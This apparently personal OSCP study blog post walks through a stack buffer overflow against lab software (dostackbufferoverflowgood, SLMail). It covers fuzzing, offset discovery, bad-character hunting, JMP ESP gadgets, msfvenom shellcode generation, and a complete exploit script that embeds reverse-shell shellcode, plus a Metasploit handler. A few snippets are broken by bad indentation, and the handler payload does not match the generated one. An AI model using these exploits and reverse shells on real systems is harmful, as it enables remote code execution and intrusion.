---
layout: post
title: Buffer Overflow Methodology
writtendate: 14th Mar 2019
img: images/bof_method.JPG
---

Methodology for Buffer Overflows. Still rough but making progress for sure.

I've been running through OSCP course and got to the buffer overflow section.
Stumbled across the "do-stack-buffer-overflow-good" from Justin Steven, which is awesome. 


### Helpful Links

- [VMware Workstation](https://www.vmware.com/uk/products/workstation-player.html)
- [Windows-VMs](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
- [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
- [Immunity Debugger](http://www.immunityinc.com/products/debugger/)
- [mona.py](https://github.com/corelan/mona)
- Optional: [IDA](https://www.hex-rays.com/products/ida/support/download_freeware.shtml)



Tested on:

- doastackbufferoverflowgood
- SLMAIL 5.5.0 (4433)


### Pre-Requisite

- A rough idea of what is susceptible to Buffer Overflows. So, we know where to send. (More experienced engineers can discover these)

- Any Protection in place Data Execution Prevention (DEP), Address Space Layout Randomization (ASLR)

### Step 1 -Fuzz

Fuzzing- Test if the Application is susceptible to Buffer overflow by sending an ever-increasing amount of data until an exception is thrown.

CODE:
```python
#!/usr/bin/python
import socket

# Create an array of buffers  from 10 to 2000  with increments of 20.
buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

for string in buffer:
  print "Fuzzing PASS with %s bytes" % len(string)
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.207',31337))
  s.recv(1024)
  s.send('USER test\r\n')   #send junk as username
  s.recv(1024)
  s.send('PASS ' + string + '\r\n') #send our string as password (this is vuln part)
  s.send('QUIT\r\n')
  s.close()
```


### Step 2 - Discover offset

Discover Offset- Send Large Unique character string to the Application (size determined in Fuzz). Identify position of each Register

Tools: pattern_create.rb & pattern_offset.rb

Create large unique string (length identified in step 1)
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
```

```python
#!/usr/bin/env python2
import socket

RHOST = "192.168.0.207"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += ("INSERT UNIQUE STRING HERE")
buf += "\n"

  s.send('USER test\r\n')   #send junk as username
  s.recv(1024)
  s.send(buf)
  s.send('QUIT\r\n')
  s.close()
```

Find the offset by taking the content of EIP when crashed example below (39654138)
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
```

Alternative: 
<div class="codeBordersingle">
!mona findmsp 
</div>


### Step 3 -Confirm Register Positions 

Send Offset minus from length of buffer, triggering the overflow
-` "A"*(offset_srp - len(buf))`

Send the SRP 
-` BBBB `

Send the ESP 
-` CCCC `

Send the Trail 
-` "D"*(buf_totlen - len(buf)) ` 

CODE:
```python
#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "192.168.0.207"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#variables
buf_totlen = 1024
offset_srp = 146

# build a happy little message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))  #padding
buf += "BBBB"			    #SRP Overwrite
buf += "CCCC"			    #ESP pointer
buf += "D"*(buf_totlen - len(buf))  #trailing
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we sent
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```


### Step 4 - Find Badchar

Identify bad characters:

Assume Already bad chars:  New line "\x0A" & Null Byte "\x00" 
 
Create a string containing all chars from \x00 to \xFF excluding \x00 and \x0A

```python
    #We've reasoned that these are definitely bad
    badchars = [0x00, 0x0A]   
    #Range(0x00, 0xFF) only returns up to 0xFE
    for i in range(0x00, 0xFF+1):    
    #Skip the badchars
    if i not in badchars:           
    #Append each non-badchar char to the string
    badchar_test += chr(i)     
```
 
right-click on ESP in the registers list and click "Follow in Dump" and check for any other badchar, repeat if necessary (removing identified badchars)

Use mona to compare:

<div class="codeBordersingle">
  !mona compare -a esp -f c:\badchar_test.bin 
</div>


### Step 5 - JMP ESP Gadget

Find a JMP ESP Gadget that hopefully doesn't include the badchars we identified

<div class="codeBordersingle">
 !mona jmp -r esp -cpb "\x00\x0A" 
</div>

Test the JMP ESP Gadget By sending INT3 in the ESP: 

```python
   buf += "\xCC\xCC\xCC\xCC"               
```


### Step 6 - Pop Calc

Generate Calc Shellcode

- Remove bad chars
- format as python
- set variable name (helps when pasting into pre-made script)


```bash
msfvenom -p windows/exec -b '\x00\x0A' \ -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread 
```



Build first exploit code with all we know from above.
REMEBER that GETPC will blow a hole in ESP. SO to get around that: Either NOP slide or Proper way ` metasm_shell.rb `

We want to move ESP up the stack towards lower addresses, so ask metasm_shell.rb to assemble the instruction SUB ESP,0x10

Entering:

```ruby
metasm > sub esp,0x10
"\x83\xec\x10" 
```

Code Overview and reasoning:

```python
    #Total length of buffer 
    buf_totlen = 1024                     
    #Our offset we identified
    offset_srp = 146                       
    #Our JMP ESP location
    ptr_jmp_esp = 0x080414C3                
    #Code to jump back 10 bytes to navigate the GETPC blowing hole in ESP
    sub_esp_10 = "\x83\xec\x10"             
    shellcode_calc =  ""
    #Our code
    shellcode_calc =  ""
    shellcode_calc += "INSERT CODE"        
    #Padding
    buf = ""
    buf += "A"*(offset_srp - len(buf))      
    #SRP overwrite struct.pack() is converting pointer to little-endian format
    buf += struct.pack("<I", ptr_jmp_esp)  
    #ESP points here
    buf += sub_esp_10                       
    #Our Exploit code
    buf += shellcode_calc                  
    #Trailing padding
    buf += "D"*(buf_totlen - len(buf))    
    buf += "\n" </li>
```


### Step 7 - RCE

Generate RCE/ reverse shell exploit

- Set localhost and port
- Remove bad chars 
- format as python
- set variable name (helps when pasting into pre-made script)


```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.208 LPORT=1337 -b '\x00\x0A' -f python --var-name shellcode_rev EXITFUNC=thread 
```

```python
#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.0.207"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

sub_esp_10 = "\x83\xec\x10"

shellcode_rev =  ""
shellcode_rev += "\xba\x4b\xcc\x4a\x71\xd9\xc9\xd9\x74\x24\xf4"
shellcode_rev += "\x5f\x33\xc9\xb1\x5b\x31\x57\x14\x83\xef\xfc"
shellcode_rev += "\x03\x57\x10\xa9\x39\xb6\x99\xaf\xc2\x47\x5a"
shellcode_rev += "\xcf\x4b\xa2\x6b\xcf\x28\xa6\xdc\xff\x3b\xea"
shellcode_rev += "\xd0\x74\x69\x1f\x62\xf8\xa6\x10\xc3\xb6\x90"
shellcode_rev += "\x1f\xd4\xea\xe1\x3e\x56\xf0\x35\xe1\x67\x3b"
shellcode_rev += "\x48\xe0\xa0\x21\xa1\xb0\x79\x2e\x14\x25\x0d"
shellcode_rev += "\x7a\xa5\xce\x5d\x6b\xad\x33\x15\x8a\x9c\xe5"
shellcode_rev += "\x2d\xd5\x3e\x07\xe1\x6e\x77\x1f\xe6\x4a\xc1"
shellcode_rev += "\x94\xdc\x21\xd0\x7c\x2d\xca\x7f\x41\x81\x39"
shellcode_rev += "\x81\x85\x26\xa1\xf4\xff\x54\x5c\x0f\xc4\x27"
shellcode_rev += "\xba\x9a\xdf\x80\x49\x3c\x04\x30\x9e\xdb\xcf"
shellcode_rev += "\x3e\x6b\xaf\x88\x22\x6a\x7c\xa3\x5f\xe7\x83"
shellcode_rev += "\x64\xd6\xb3\xa7\xa0\xb2\x60\xc9\xf1\x1e\xc7"
shellcode_rev += "\xf6\xe2\xc0\xb8\x52\x68\xec\xad\xee\x33\x79"
shellcode_rev += "\x02\xc3\xcb\x79\x0c\x54\xbf\x4b\x93\xce\x57"
shellcode_rev += "\xe0\x5c\xc9\xa0\x71\x4a\xea\x7f\x39\x1a\x14"
shellcode_rev += "\x80\x3a\x33\xd3\xd4\x6a\x2b\xf2\x54\xe1\xab"
shellcode_rev += "\xfb\x80\x9c\xa1\x6b\xeb\xc9\xb5\xbb\x83\x0b"
shellcode_rev += "\xb5\x3e\x6d\x85\x53\x10\xdd\xc5\xcb\xd1\x8d"
shellcode_rev += "\xa5\xbb\xb9\xc7\x29\xe4\xda\xe7\xe3\x8d\x71"
shellcode_rev += "\x08\x5a\xe6\xed\xb1\xc7\x7c\x8f\x3e\xd2\xf9"
shellcode_rev += "\x8f\xb5\xd7\xfe\x5e\x3e\x9d\xec\xb7\x59\x5d"
shellcode_rev += "\xec\x47\xcc\x5d\x86\x43\x46\x09\x3e\x4e\xbf"
shellcode_rev += "\x7d\xe1\xb1\xea\xfd\xe5\x4e\x6b\x34\x9e\x79"
shellcode_rev += "\xf9\x78\xc8\x85\xed\x78\x08\xd0\x67\x79\x60"
shellcode_rev += "\x84\xd3\x2a\x95\xcb\xc9\x5e\x06\x5e\xf2\x36"
shellcode_rev += "\xfb\xc9\x9a\xb4\x22\x3d\x05\x46\x01\x3d\x42"
shellcode_rev += "\xb8\xd4\x6a\xeb\xd1\x26\x2b\x0b\x22\x4c\xab"
shellcode_rev += "\x5b\x4a\x9b\x84\x54\xba\x64\x0f\x3d\xd2\xef"
shellcode_rev += "\xde\x8f\x43\xf0\xca\x4e\xda\xf1\xf9\x4a\xed"
shellcode_rev += "\x88\x72\x6c\x0e\x6d\x9b\x09\x0e\x6e\xa3\x2f"
shellcode_rev += "\x32\xb9\x9a\x45\x75\x7a\x99\x46\x68\x56\xd4"
shellcode_rev += "\xee\x35\x33\x55\x73\xc6\xee\x9a\x8a\x45\x1a"
shellcode_rev += "\x63\x69\x55\x6f\x66\x35\xd1\x9c\x1a\x26\xb4"
shellcode_rev += "\xa2\x89\x47\x9d"


buf = ""
buf += "A"*(offset_srp - len(buf))      # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode_rev
buf += "D"*(buf_totlen - len(buf))      # trailing padding
buf += "\n"

s.send(buf)
```

Before executing set up multi handler to catch the shell:

- msfconsole
- use exploit/multi/handler 
- set payload windows/meterpreter/reverse_tcp
- set lhost 192.168.0.208
- set lport 1337
- options (TO CONFIRM)
- exploit

As always this is for learning purposes, please don't be dumb with this stuff. 

Cheers,
Thomas
